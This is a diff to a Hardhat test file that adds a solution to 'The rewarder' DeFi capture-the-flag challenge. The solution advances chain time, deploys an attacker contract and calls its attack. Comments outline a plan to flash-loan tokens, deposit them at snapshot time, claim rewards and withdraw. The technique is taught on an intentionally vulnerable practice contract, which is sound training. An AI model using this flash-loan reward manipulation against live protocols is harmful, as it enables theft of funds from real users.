@@ -25,6 +25,10 @@ describe('[Challenge] The rewarder', function () {
         await liquidityToken.transfer(flashLoanPool.address, TOKENS_IN_LENDER_POOL);
 
         rewarderPool = await TheRewarderPoolFactory.deploy(liquidityToken.address);
+
+        // Henryk: we do attach here because in the pool new instances of
+        // the reward token and the accounting token were made instead of being
+        // injected
         rewardToken = RewardTokenFactory.attach(await rewarderPool.rewardToken());
         accountingToken = AccountingTokenFactory.attach(await rewarderPool.accountingToken());
 
@@ -70,6 +74,29 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // Henryk: Advance time 5 days so that depositors can get rewards
+        // Henryk: Note that this would only work if no one else did "distributeRewards"
+        // becuase the snap shot would be recorded and the flash loan and deposit
+        // wouldn't have happened in the point in time
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        const RewarderAttackerFactory = await ethers.getContractFactory('RewarderAttacker', player);
+        const attacker = await RewarderAttackerFactory.deploy(
+            rewarderPool.address, 
+            flashLoanPool.address,
+            liquidityToken.address,
+            rewardToken.address,
+        );
+
+        await attacker.attack();
+
+        // Original plan:
+        // Push forward the clock to be able to execute at the perfect time
+        // Take out a flash loan
+        // Deposit to pool
+        // Claim
+        // Withdraw
     });
 
     after(async function () {
